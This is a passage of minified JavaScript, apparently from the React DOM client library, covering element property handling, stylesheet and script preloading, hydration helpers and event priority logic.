e?e[n]=r:!0===r?e.setAttribute(n,``):Rt(e,n,r)}}}function Pd(e,t,n){switch(t){case`div`:case`span`:case`svg`:case`path`:case`a`:case`g`:case`p`:case`li`:break;case`img`:Q(`error`,e),Q(`load`,e);var r=!1,i=!1,a;for(a in n)if(n.hasOwnProperty(a)){var s=n[a];if(s!=null)switch(a){case`src`:r=!0;break;case`srcSet`:i=!0;break;case`children`:case`dangerouslySetInnerHTML`:throw Error(o(137,t));default:$(e,t,a,s,n,null)}}i&&$(e,t,`srcSet`,n.srcSet,n,null),r&&$(e,t,`src`,n.src,n,null);return;case`input`:Q(`invalid`,e);var c=a=s=i=null,l=null,u=null;for(r in n)if(n.hasOwnProperty(r)){var d=n[r];if(d!=null)switch(r){case`name`:i=d;break;case`type`:s=d;break;case`checked`:l=d;break;case`defaultChecked`:u=d;break;case`value`:a=d;break;case`defaultValue`:c=d;break;case`children`:case`dangerouslySetInnerHTML`:if(d!=null)throw Error(o(137,t));break;default:$(e,t,r,d,n,null)}}Xt(e,a,c,l,u,s,i,!1);return;case`select`:for(i in Q(`invalid`,e),r=s=a=null,n)if(n.hasOwnProperty(i)&&(c=n[i],c!=null))switch(i){case`value`:a=c;break;case`defaultValue`:s=c;break;case`multiple`:r=c;default:$(e,t,i,c,n,null)}t=a,n=s,e.multiple=!!r,t==null?n!=null&&Qt(e,!!r,n,!0):Qt(e,!!r,t,!1);return;case`textarea`:for(s in Q(`invalid`,e),a=i=r=null,n)if(n.hasOwnProperty(s)&&(c=n[s],c!=null))switch(s){case`value`:r=c;break;case`defaultValue`:i=c;break;case`children`:a=c;break;case`dangerouslySetInnerHTML`:if(c!=null)throw Error(o(91));break;default:$(e,t,s,c,n,null)}en(e,r,i,a);return;case`option`:for(l in n)if(n.hasOwnProperty(l)&&(r=n[l],r!=null))switch(l){case`selected`:e.selected=r&&typeof r!=`function`&&typeof r!=`symbol`;break;default:$(e,t,l,r,n,null)}return;case`dialog`:Q(`beforetoggle`,e),Q(`toggle`,e),Q(`cancel`,e),Q(`close`,e);break;case`iframe`:case`object`:Q(`load`,e);break;case`video`:case`audio`:for(r=0;r<_d.length;r++)Q(_d[r],e);break;case`image`:Q(`error`,e),Q(`load`,e);break;case`details`:Q(`toggle`,e);break;case`embed`:case`source`:case`link`:Q(`error`,e),Q(`load`,e);case`area`:case`base`:case`br`:case`col`:case`hr`:case`keygen`:case`meta`:case`param`:case`track`:case`wbr`:case`menuitem`:for(u in n)if(n.hasOwnProperty(u)&&(r=n[u],r!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:throw Error(o(137,t));default:$(e,t,u,r,n,null)}return;default:if(on(t)){for(d in n)n.hasOwnProperty(d)&&(r=n[d],r!==void 0&&Nd(e,t,d,r,n,void 0));return}}for(c in n)n.hasOwnProperty(c)&&(r=n[c],r!=null&&$(e,t,c,r,n,null))}function Fd(e,t,n,r){switch(t){case`div`:case`span`:case`svg`:case`path`:case`a`:case`g`:case`p`:case`li`:break;case`input`:var i=null,a=null,s=null,c=null,l=null,u=null,d=null;for(m in n){var f=n[m];if(n.hasOwnProperty(m)&&f!=null)switch(m){case`checked`:break;case`value`:break;case`defaultValue`:l=f;default:r.hasOwnProperty(m)||$(e,t,m,null,r,f)}}for(var p in r){var m=r[p];if(f=n[p],r.hasOwnProperty(p)&&(m!=null||f!=null))switch(p){case`type`:a=m;break;case`name`:i=m;break;case`checked`:u=m;break;case`defaultChecked`:d=m;break;case`value`:s=m;break;case`defaultValue`:c=m;break;case`children`:case`dangerouslySetInnerHTML`:if(m!=null)throw Error(o(137,t));break;default:m!==f&&$(e,t,p,m,r,f)}}Yt(e,s,c,l,u,d,a,i);return;case`select`:for(a in m=s=c=p=null,n)if(l=n[a],n.hasOwnProperty(a)&&l!=null)switch(a){case`value`:break;case`multiple`:m=l;default:r.hasOwnProperty(a)||$(e,t,a,null,r,l)}for(i in r)if(a=r[i],l=n[i],r.hasOwnProperty(i)&&(a!=null||l!=null))switch(i){case`value`:p=a;break;case`defaultValue`:c=a;break;case`multiple`:s=a;default:a!==l&&$(e,t,i,a,r,l)}t=c,n=s,r=m,p==null?!!r!=!!n&&(t==null?Qt(e,!!n,n?[]:``,!1):Qt(e,!!n,t,!0)):Qt(e,!!n,p,!1);return;case`textarea`:for(c in m=p=null,n)if(i=n[c],n.hasOwnProperty(c)&&i!=null&&!r.hasOwnProperty(c))switch(c){case`value`:break;case`children`:break;default:$(e,t,c,null,r,i)}for(s in r)if(i=r[s],a=n[s],r.hasOwnProperty(s)&&(i!=null||a!=null))switch(s){case`value`:p=i;break;case`defaultValue`:m=i;break;case`children`:break;case`dangerouslySetInnerHTML`:if(i!=null)throw Error(o(91));break;default:i!==a&&$(e,t,s,i,r,a)}$t(e,p,m);return;case`option`:for(var h in n)if(p=n[h],n.hasOwnProperty(h)&&p!=null&&!r.hasOwnProperty(h))switch(h){case`selected`:e.selected=!1;break;default:$(e,t,h,null,r,p)}for(l in r)if(p=r[l],m=n[l],r.hasOwnProperty(l)&&p!==m&&(p!=null||m!=null))switch(l){case`selected`:e.selected=p&&typeof p!=`function`&&typeof p!=`symbol`;break;default:$(e,t,l,p,r,m)}return;case`img`:case`link`:case`area`:case`base`:case`br`:case`col`:case`embed`:case`hr`:case`keygen`:case`meta`:case`param`:case`source`:case`track`:case`wbr`:case`menuitem`:for(var g in n)p=n[g],n.hasOwnProperty(g)&&p!=null&&!r.hasOwnProperty(g)&&$(e,t,g,null,r,p);for(u in r)if(p=r[u],m=n[u],r.hasOwnProperty(u)&&p!==m&&(p!=null||m!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:if(p!=null)throw Error(o(137,t));break;default:$(e,t,u,p,r,m)}return;default:if(on(t)){for(var _ in n)p=n[_],n.hasOwnProperty(_)&&p!==void 0&&!r.hasOwnProperty(_)&&Nd(e,t,_,void 0,r,p);for(d in r)p=r[d],m=n[d],!r.hasOwnProperty(d)||p===m||p===void 0&&m===void 0||Nd(e,t,d,p,r,m);return}}for(var v in n)p=n[v],n.hasOwnProperty(v)&&p!=null&&!r.hasOwnProperty(v)&&$(e,t,v,null,r,p);for(f in r)p=r[f],m=n[f],!r.hasOwnProperty(f)||p===m||p==null&&m==null||$(e,t,f,p,r,m)}function Id(e){switch(e){case`css`:case`script`:case`font`:case`img`:case`image`:case`input`:case`link`:return!0;default:return!1}}function Ld(){if(typeof performance.getEntriesByType==`function`){for(var e=0,t=0,n=performance.getEntriesByType(`resource`),r=0;r<n.length;r++){var i=n[r],a=i.transferSize,o=i.initiatorType,s=i.duration;if(a&&s&&Id(o)){for(o=0,s=i.responseEnd,r+=1;r<n.length;r++){var c=n[r],l=c.startTime;if(l>s)break;var u=c.transferSize,d=c.initiatorType;u&&Id(d)&&(c=c.responseEnd,o+=u*(c<s?1:(s-l)/(c-l)))}if(--r,t+=8*(a+o)/(i.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e==`number`)?e:5}var Rd=null,zd=null;function Bd(e){return e.nodeType===9?e:e.ownerDocument}function Vd(e){switch(e){case`http://www.w3.org/2000/svg`:return 1;case`http://www.w3.org/1998/Math/MathML`:return 2;default:return 0}}function Hd(e,t){if(e===0)switch(t){case`svg`:return 1;case`math`:return 2;default:return 0}return e===1&&t===`foreignObject`?0:e}function Ud(e,t){return e===`textarea`||e===`noscript`||typeof t.children==`string`||typeof t.children==`number`||typeof t.children==`bigint`||typeof t.dangerouslySetInnerHTML==`object`&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Wd=null;function Gd(){var e=window.event;return e&&e.type===`popstate`?e===Wd?!1:(Wd=e,!0):(Wd=null,!1)}var Kd=typeof setTimeout==`function`?setTimeout:void 0,qd=typeof clearTimeout==`function`?clearTimeout:void 0,Jd=typeof Promise==`function`?Promise:void 0,Yd=typeof queueMicrotask==`function`?queueMicrotask:Jd===void 0?Kd:function(e){return Jd.resolve(null).then(e).catch(Xd)};function Xd(e){setTimeout(function(){throw e})}function Zd(e){return e===`head`}function Qd(e,t){var n=t,r=0;do{var i=n.nextSibling;if(e.removeChild(n),i&&i.nodeType===8)if(n=i.data,n===`/$`||n===`/&`){if(r===0){e.removeChild(i),Np(t);return}r--}else if(n===`$`||n===`$?`||n===`$~`||n===`$!`||n===`&`)r++;else if(n===`html`)pf(e.ownerDocument.documentElement);else if(n===`head`){n=e.ownerDocument.head,pf(n);for(var a=n.firstChild;a;){var o=a.nextSibling,s=a.nodeName;a[Ct]||s===`SCRIPT`||s===`STYLE`||s===`LINK`&&a.rel.toLowerCase()===`stylesheet`||n.removeChild(a),a=o}}else n===`body`&&pf(e.ownerDocument.body);n=i}while(n);Np(t)}function $d(e,t){var n=e;e=0;do{var r=n.nextSibling;if(n.nodeType===1?t?(n._stashedDisplay=n.style.display,n.style.display=`none`):(n.style.display=n._stashedDisplay||``,n.getAttribute(`style`)===``&&n.removeAttribute(`style`)):n.nodeType===3&&(t?(n._stashedText=n.nodeValue,n.nodeValue=``):n.nodeValue=n._stashedText||``),r&&r.nodeType===8)if(n=r.data,n===`/$`){if(e===0)break;e--}else n!==`$`&&n!==`$?`&&n!==`$~`&&n!==`$!`||e++;n=r}while(n)}function ef(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var n=t;switch(t=t.nextSibling,n.nodeName){case`HTML`:case`HEAD`:case`BODY`:ef(n),wt(n);continue;case`SCRIPT`:case`STYLE`:continue;case`LINK`:if(n.rel.toLowerCase()===`stylesheet`)continue}e.removeChild(n)}}function tf(e,t,n,r){for(;e.nodeType===1;){var i=n;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!r&&(e.nodeName!==`INPUT`||e.type!==`hidden`))break}else if(!r)if(t===`input`&&e.type===`hidden`){var a=i.name==null?null:``+i.name;if(i.type===`hidden`&&e.getAttribute(`name`)===a)return e}else return e;else if(!e[Ct])switch(t){case`meta`:if(!e.hasAttribute(`itemprop`))break;return e;case`link`:if(a=e.getAttribute(`rel`),a===`stylesheet`&&e.hasAttribute(`data-precedence`)||a!==i.rel||e.getAttribute(`href`)!==(i.href==null||i.href===``?null:i.href)||e.getAttribute(`crossorigin`)!==(i.crossOrigin==null?null:i.crossOrigin)||e.getAttribute(`title`)!==(i.title==null?null:i.title))break;return e;case`style`:if(e.hasAttribute(`data-precedence`))break;return e;case`script`:if(a=e.getAttribute(`src`),(a!==(i.src==null?null:i.src)||e.getAttribute(`type`)!==(i.type==null?null:i.type)||e.getAttribute(`crossorigin`)!==(i.crossOrigin==null?null:i.crossOrigin))&&a&&e.hasAttribute(`async`)&&!e.hasAttribute(`itemprop`))break;return e;default:return e}if(e=cf(e.nextSibling),e===null)break}return null}function nf(e,t,n){if(t===``)return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!==`INPUT`||e.type!==`hidden`)&&!n||(e=cf(e.nextSibling),e===null))return null;return e}function rf(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!==`INPUT`||e.type!==`hidden`)&&!t||(e=cf(e.nextSibling),e===null))return null;return e}function af(e){return e.data===`$?`||e.data===`$~`}function of(e){return e.data===`$!`||e.data===`$?`&&e.ownerDocument.readyState!==`loading`}function sf(e,t){var n=e.ownerDocument;if(e.data===`$~`)e._reactRetry=t;else if(e.data!==`$?`||n.readyState!==`loading`)t();else{var r=function(){t(),n.removeEventListener(`DOMContentLoaded`,r)};n.addEventListener(`DOMContentLoaded`,r),e._reactRetry=r}}function cf(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t===`$`||t===`$!`||t===`$?`||t===`$~`||t===`&`||t===`F!`||t===`F`)break;if(t===`/$`||t===`/&`)return null}}return e}var lf=null;function uf(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n===`/$`||n===`/&`){if(t===0)return cf(e.nextSibling);t--}else n!==`$`&&n!==`$!`&&n!==`$?`&&n!==`$~`&&n!==`&`||t++}e=e.nextSibling}return null}function df(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n===`$`||n===`$!`||n===`$?`||n===`$~`||n===`&`){if(t===0)return e;t--}else n!==`/$`&&n!==`/&`||t++}e=e.previousSibling}return null}function ff(e,t,n){switch(t=Bd(n),e){case`html`:if(e=t.documentElement,!e)throw Error(o(452));return e;case`head`:if(e=t.head,!e)throw Error(o(453));return e;case`body`:if(e=t.body,!e)throw Error(o(454));return e;default:throw Error(o(451))}}function pf(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);wt(e)}var mf=new Map,hf=new Set;function gf(e){return typeof e.getRootNode==`function`?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var _f=E.d;E.d={f:vf,r:yf,D:Sf,C:Cf,L:wf,m:Tf,X:Df,S:Ef,M:Of};function vf(){var e=_f.f(),t=bu();return e||t}function yf(e){var t=Et(e);t!==null&&t.tag===5&&t.type===`form`?ks(t):_f.r(e)}var bf=typeof document>`u`?null:document;function xf(e,t,n){var r=bf;if(r&&typeof t==`string`&&t){var i=Jt(t);i=`link[rel="`+e+`"][href="`+i+`"]`,typeof n==`string`&&(i+=`[crossorigin="`+n+`"]`),hf.has(i)||(hf.add(i),e={rel:e,crossOrigin:n,href:t},r.querySelector(i)===null&&(t=r.createElement(`link`),Pd(t,`link`,e),kt(t),r.head.appendChild(t)))}}function Sf(e){_f.D(e),xf(`dns-prefetch`,e,null)}function Cf(e,t){_f.C(e,t),xf(`preconnect`,e,t)}function wf(e,t,n){_f.L(e,t,n);var r=bf;if(r&&e&&t){var i=`link[rel="preload"][as="`+Jt(t)+`"]`;t===`image`&&n&&n.imageSrcSet?(i+=`[imagesrcset="`+Jt(n.imageSrcSet)+`"]`,typeof n.imageSizes==`string`&&(i+=`[imagesizes="`+Jt(n.imageSizes)+`"]`)):i+=`[href="`+Jt(e)+`"]`;var a=i;switch(t){case`style`:a=Af(e);break;case`script`:a=Pf(e)}mf.has(a)||(e=h({rel:`preload`,href:t===`image`&&n&&n.imageSrcSet?void 0:e,as:t},n),mf.set(a,e),r.querySelector(i)!==null||t===`style`&&r.querySelector(jf(a))||t===`script`&&r.querySelector(Ff(a))||(t=r.createElement(`link`),Pd(t,`link`,e),kt(t),r.head.appendChild(t)))}}function Tf(e,t){_f.m(e,t);var n=bf;if(n&&e){var r=t&&typeof t.as==`string`?t.as:`script`,i=`link[rel="modulepreload"][as="`+Jt(r)+`"][href="`+Jt(e)+`"]`,a=i;switch(r){case`audioworklet`:case`paintworklet`:case`serviceworker`:case`sharedworker`:case`worker`:case`script`:a=Pf(e)}if(!mf.has(a)&&(e=h({rel:`modulepreload`,href:e},t),mf.set(a,e),n.querySelector(i)===null)){switch(r){case`audioworklet`:case`paintworklet`:case`serviceworker`:case`sharedworker`:case`worker`:case`script`:if(n.querySelector(Ff(a)))return}r=n.createElement(`link`),Pd(r,`link`,e),kt(r),n.head.appendChild(r)}}}function Ef(e,t,n){_f.S(e,t,n);var r=bf;if(r&&e){var i=Ot(r).hoistableStyles,a=Af(e);t||=`default`;var o=i.get(a);if(!o){var s={loading:0,preload:null};if(o=r.querySelector(jf(a)))s.loading=5;else{e=h({rel:`stylesheet`,href:e,"data-precedence":t},n),(n=mf.get(a))&&Rf(e,n);var c=o=r.createElement(`link`);kt(c),Pd(c,`link`,e),c._p=new Promise(function(e,t){c.onload=e,c.onerror=t}),c.addEventListener(`load`,function(){s.loading|=1}),c.addEventListener(`error`,function(){s.loading|=2}),s.loading|=4,Lf(o,t,r)}o={type:`stylesheet`,instance:o,count:1,state:s},i.set(a,o)}}}function Df(e,t){_f.X(e,t);var n=bf;if(n&&e){var r=Ot(n).hoistableScripts,i=Pf(e),a=r.get(i);a||(a=n.querySelector(Ff(i)),a||(e=h({src:e,async:!0},t),(t=mf.get(i))&&zf(e,t),a=n.createElement(`script`),kt(a),Pd(a,`link`,e),n.head.appendChild(a)),a={type:`script`,instance:a,count:1,state:null},r.set(i,a))}}function Of(e,t){_f.M(e,t);var n=bf;if(n&&e){var r=Ot(n).hoistableScripts,i=Pf(e),a=r.get(i);a||(a=n.querySelector(Ff(i)),a||(e=h({src:e,async:!0,type:`module`},t),(t=mf.get(i))&&zf(e,t),a=n.createElement(`script`),kt(a),Pd(a,`link`,e),n.head.appendChild(a)),a={type:`script`,instance:a,count:1,state:null},r.set(i,a))}}function kf(e,t,n,r){var i=(i=ve.current)?gf(i):null;if(!i)throw Error(o(446));switch(e){case`meta`:case`title`:return null;case`style`:return typeof n.precedence==`string`&&typeof n.href==`string`?(t=Af(n.href),n=Ot(i).hoistableStyles,r=n.get(t),r||(r={type:`style`,instance:null,count:0,state:null},n.set(t,r)),r):{type:`void`,instance:null,count:0,state:null};case`link`:if(n.rel===`stylesheet`&&typeof n.href==`string`&&typeof n.precedence==`string`){e=Af(n.href);var a=Ot(i).hoistableStyles,s=a.get(e);if(s||(i=i.ownerDocument||i,s={type:`stylesheet`,instance:null,count:0,state:{loading:0,preload:null}},a.set(e,s),(a=i.querySelector(jf(e)))&&!a._p&&(s.instance=a,s.state.loading=5),mf.has(e)||(n={rel:`preload`,as:`style`,href:n.href,crossOrigin:n.crossOrigin,integrity:n.integrity,media:n.media,hrefLang:n.hrefLang,referrerPolicy:n.referrerPolicy},mf.set(e,n),a||Nf(i,e,n,s.state))),t&&r===null)throw Error(o(528,``));return s}if(t&&r!==null)throw Error(o(529,``));return null;case`script`:return t=n.async,n=n.src,typeof n==`string`&&t&&typeof t!=`function`&&typeof t!=`symbol`?(t=Pf(n),n=Ot(i).hoistableScripts,r=n.get(t),r||(r={type:`script`,instance:null,count:0,state:null},n.set(t,r)),r):{type:`void`,instance:null,count:0,state:null};default:throw Error(o(444,e))}}function Af(e){return`href="`+Jt(e)+`"`}function jf(e){return`link[rel="stylesheet"][`+e+`]`}function Mf(e){return h({},e,{"data-precedence":e.precedence,precedence:null})}function Nf(e,t,n,r){e.querySelector(`link[rel="preload"][as="style"][`+t+`]`)?r.loading=1:(t=e.createElement(`link`),r.preload=t,t.addEventListener(`load`,function(){return r.loading|=1}),t.addEventListener(`error`,function(){return r.loading|=2}),Pd(t,`link`,n),kt(t),e.head.appendChild(t))}function Pf(e){return`[src="`+Jt(e)+`"]`}function Ff(e){return`script[async]`+e}function If(e,t,n){if(t.count++,t.instance===null)switch(t.type){case`style`:var r=e.querySelector(`style[data-href~="`+Jt(n.href)+`"]`);if(r)return t.instance=r,kt(r),r;var i=h({},n,{"data-href":n.href,"data-precedence":n.precedence,href:null,precedence:null});return r=(e.ownerDocument||e).createElement(`style`),kt(r),Pd(r,`style`,i),Lf(r,n.precedence,e),t.instance=r;case`stylesheet`:i=Af(n.href);var a=e.querySelector(jf(i));if(a)return t.state.loading|=4,t.instance=a,kt(a),a;r=Mf(n),(i=mf.get(i))&&Rf(r,i),a=(e.ownerDocument||e).createElement(`link`),kt(a);var s=a;return s._p=new Promise(function(e,t){s.onload=e,s.onerror=t}),Pd(a,`link`,r),t.state.loading|=4,Lf(a,n.precedence,e),t.instance=a;case`script`:return a=Pf(n.src),(i=e.querySelector(Ff(a)))?(t.instance=i,kt(i),i):(r=n,(i=mf.get(a))&&(r=h({},n),zf(r,i)),e=e.ownerDocument||e,i=e.createElement(`script`),kt(i),Pd(i,`link`,r),e.head.appendChild(i),t.instance=i);case`void`:return null;default:throw Error(o(443,t.type))}else t.type===`stylesheet`&&!(t.state.loading&4)&&(r=t.instance,t.state.loading|=4,Lf(r,n.precedence,e));return t.instance}function Lf(e,t,n){for(var r=n.querySelectorAll(`link[rel="stylesheet"][data-precedence],style[data-precedence]`),i=r.length?r[r.length-1]:null,a=i,o=0;o<r.length;o++){var s=r[o];if(s.dataset.precedence===t)a=s;else if(a!==i)break}a?a.parentNode.insertBefore(e,a.nextSibling):(t=n.nodeType===9?n.head:n,t.insertBefore(e,t.firstChild))}function Rf(e,t){e.crossOrigin??=t.crossOrigin,e.referrerPolicy??=t.referrerPolicy,e.title??=t.title}function zf(e,t){e.crossOrigin??=t.crossOrigin,e.referrerPolicy??=t.referrerPolicy,e.integrity??=t.integrity}var Bf=null;function Vf(e,t,n){if(Bf===null){var r=new Map,i=Bf=new Map;i.set(n,r)}else i=Bf,r=i.get(n),r||(r=new Map,i.set(n,r));if(r.has(e))return r;for(r.set(e,null),n=n.getElementsByTagName(e),i=0;i<n.length;i++){var a=n[i];if(!(a[Ct]||a[O]||e===`link`&&a.getAttribute(`rel`)===`stylesheet`)&&a.namespaceURI!==`http://www.w3.org/2000/svg`){var o=a.getAttribute(t)||``;o=e+o;var s=r.get(o);s?s.push(a):r.set(o,[a])}}return r}function Hf(e,t,n){e=e.ownerDocument||e,e.head.insertBefore(n,t===`title`?e.querySelector(`head > title`):null)}function Uf(e,t,n){if(n===1||t.itemProp!=null)return!1;switch(e){case`meta`:case`title`:return!0;case`style`:if(typeof t.precedence!=`string`||typeof t.href!=`string`||t.href===``)break;return!0;case`link`:if(typeof t.rel!=`string`||typeof t.href!=`string`||t.href===``||t.onLoad||t.onError)break;switch(t.rel){case`stylesheet`:return e=t.disabled,typeof t.precedence==`string`&&e==null;default:return!0}case`script`:if(t.async&&typeof t.async!=`function`&&typeof t.async!=`symbol`&&!t.onLoad&&!t.onError&&t.src&&typeof t.src==`string`)return!0}return!1}function Wf(e){return!(e.type===`stylesheet`&&!(e.state.loading&3))}function Gf(e,t,n,r){if(n.type===`stylesheet`&&(typeof r.media!=`string`||!1!==matchMedia(r.media).matches)&&!(n.state.loading&4)){if(n.instance===null){var i=Af(r.href),a=t.querySelector(jf(i));if(a){t=a._p,typeof t==`object`&&t&&typeof t.then==`function`&&(e.count++,e=Jf.bind(e),t.then(e,e)),n.state.loading|=4,n.instance=a,kt(a);return}a=t.ownerDocument||t,r=Mf(r),(i=mf.get(i))&&Rf(r,i),a=a.createElement(`link`),kt(a);var o=a;o._p=new Promise(function(e,t){o.onload=e,o.onerror=t}),Pd(a,`link`,r),n.instance=a}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(n,t),(t=n.state.preload)&&!(n.state.loading&3)&&(e.count++,n=Jf.bind(e),t.addEventListener(`load`,n),t.addEventListener(`error`,n))}}var Kf=0;function qf(e,t){return e.stylesheets&&e.count===0&&Xf(e,e.stylesheets),0<e.count||0<e.imgCount?function(n){var r=setTimeout(function(){if(e.stylesheets&&Xf(e,e.stylesheets),e.unsuspend){var t=e.unsuspend;e.unsuspend=null,t()}},6e4+t);0<e.imgBytes&&Kf===0&&(Kf=62500*Ld());var i=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&Xf(e,e.stylesheets),e.unsuspend)){var t=e.unsuspend;e.unsuspend=null,t()}},(e.imgBytes>Kf?50:800)+t);return e.unsuspend=n,function(){e.unsuspend=null,clearTimeout(r),clearTimeout(i)}}:null}function Jf(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)Xf(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var Yf=null;function Xf(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Yf=new Map,t.forEach(Zf,e),Yf=null,Jf.call(e))}function Zf(e,t){if(!(t.state.loading&4)){var n=Yf.get(e);if(n)var r=n.get(null);else{n=new Map,Yf.set(e,n);for(var i=e.querySelectorAll(`link[data-precedence],style[data-precedence]`),a=0;a<i.length;a++){var o=i[a];(o.nodeName===`LINK`||o.getAttribute(`media`)!==`not all`)&&(n.set(o.dataset.precedence,o),r=o)}r&&n.set(null,r)}i=t.instance,o=i.getAttribute(`data-precedence`),a=n.get(o)||r,a===r&&n.set(null,i),n.set(o,i),this.count++,r=Jf.bind(this),i.addEventListener(`load`,r),i.addEventListener(`error`,r),a?a.parentNode.insertBefore(i,a.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(i,e.firstChild)),t.state.loading|=4}}var Qf={$$typeof:C,Provider:null,Consumer:null,_currentValue:de,_currentValue2:de,_threadCount:0};function $f(e,t,n,r,i,a,o,s,c){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=ot(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=ot(0),this.hiddenUpdates=ot(null),this.identifierPrefix=r,this.onUncaughtError=i,this.onCaughtError=a,this.onRecoverableError=o,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=c,this.incompleteTransitions=new Map}function ep(e,t,n,r,i,a,o,s,c,l,u,d){return e=new $f(e,t,n,o,c,l,u,d,s),t=1,!0===a&&(t|=24),a=hi(3,null,null,t),e.current=a,a.stateNode=e,t=pa(),t.refCount++,e.pooledCache=t,t.refCount++,a.memoizedState={element:r,isDehydrated:n,cache:t},Ka(a),e}function tp(e){return e?(e=pi,e):pi}function np(e,t,n,r,i,a){i=tp(i),r.context===null?r.context=i:r.pendingContext=i,r=Ja(t),r.payload={element:n},a=a===void 0?null:a,a!==null&&(r.callback=a),n=Ya(e,r,t),n!==null&&(hu(n,e,t),Xa(n,e,t))}function rp(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function ip(e,t){rp(e,t),(e=e.alternate)&&rp(e,t)}function ap(e){if(e.tag===13||e.tag===31){var t=ui(e,67108864);t!==null&&hu(t,e,67108864),ip(e,67108864)}}function op(e){if(e.tag===13||e.tag===31){var t=pu();t=ft(t);var n=ui(e,t);n!==null&&hu(n,e,t),ip(e,t)}}var sp=!0;function cp(e,t,n,r){var i=T.T;T.T=null;var a=E.p;try{E.p=2,up(e,t,n,r)}finally{E.p=a,T.T=i}}function lp(e,t,n,r){var i=T.T;T.T=null;var a=E.p;try{E.p=8,up(e,t,n,r)}finally{E.p=a,T.T=i}}function up(e,t,n,r){if(sp){var i=dp(r);if(i===null)wd(e,t,r,fp,n),Cp(e,r);else if(Tp(i,e,t,n,r))r.stopPropagation();else if(Cp(e,r),t&4&&-1<Sp.indexOf(e)){for(;i!==null;){var a=Et(i);if(a!==null)switch(a.tag){case 3:if(a=a.stateNode,a.current.memoizedState.isDehydrated){var o=tt(a.pendingLanes);if(o!==0){var s=a;for(s.pendingLanes|=2,s.entangledLanes|=2;o;){var c=1<<31-Je(o);s.entanglements[1]|=c,o&=~c}rd(a),!(G&6)&&(tu=Ie()+500,id(0,!1))}}break;case 31:case 13:s=ui(a,2),s!==null&&hu(s,a,2),bu(),ip(a,2)}if(a=dp(r),a===null&&wd(e,t,r,fp,n),a===i)break;i=a}i!==null&&r.stopPropagation()}else wd(e,t,r,null,n)}}function dp(e){return e=fn(e),pp(e)}var fp=null;function pp(e){if(fp=null,e=Tt(e),e!==null){var t=l(e);if(t===null)e=null;else{var n=t.tag;if(n===13){if(e=u(t),e!==null)return e;e=null}else if(n===31){if(e=d(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return fp=e,null}function mp(e){switch(e){case`beforetoggle`:case`cancel`:case`click`:case`close`:case`contextmenu`:case`copy`:case`cut`:case`auxclick`:case`dblclick`:case`dragend`:case`dragstart`:case`drop`:case`focusin`:case`focusout`:case`input`:case`invalid`:case`keydown`:case`keypress`:case`keyup`:case`mousedown`:case`mouseup`:case`paste`:case`pause`:case`play`:case`pointercancel`:case`pointerdown`:case`pointerup`:case`ratechange`:case`reset`:case`resize`:case`seeked`:case`submit`:case`toggle`:case`touchcancel`:case`touchend`:case`touchstart`:case`volumechange`:case`change`:case`selectionchange`:case`textInput`:case`compositionstart`:case`compositionend`:case`compositionupdate`:case`beforeblur`:case`afterblur`:case`beforeinput`:case`blur`:case`fullscreenchange`:case`focus`:case`hashchange`:case`popstate`:case`select`:case`selectstart`:return 2;case`drag`:case`dragenter`:case`dragexit`:case`dragleave`:case`dragover`:case`mousemove`:case`mouseout`:case`mouseover`:case`pointermove`:case`pointerout`:case`pointerover`:case`scroll`:case`touchmove`:case`wheel`:case`mouseenter`:case`mouseleave`:case`pointerenter`:case`pointerleave`:return 8;case`message`:switch(Le()){case Re:return 2;case ze:return 8;case Be:case Ve:return 32;case He:return 268435456;default:return 32}default:return 32}}var hp=!1,gp=null,_p=null,vp=null,yp=new Map,bp=new Map,xp=[],Sp=`mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset`.split(` `);function Cp(e,t){switch(e){case`focusin`:case`focusout`:gp=null;break;case`dragenter`:case`dragleave`:_p=null;break;case`mouseover`:case`mouseout`:vp=null;break;case`pointerover`:case`pointerout`:yp.delete(t.pointerId);break;case`gotpointercapture`:case`lostpointercapture`:bp.delete(t.pointerId)}}function wp(e,t,n,r,i,a){return e===null||e.nativeEvent!==a?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:a,targetContainers:[i]},t!==null&&(t=Et(t),t!==null&&ap(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,i!==null&&t.indexOf(i)===-1&&t.push(i),e)}function Tp(e,t,n,r,i){switch(t){case`focusin`:return gp=wp(gp,e,t,n,r,i),!0;case`dragenter`:return _p=wp(_p,e,t,n,r,i),!0;case`mouseover`:return 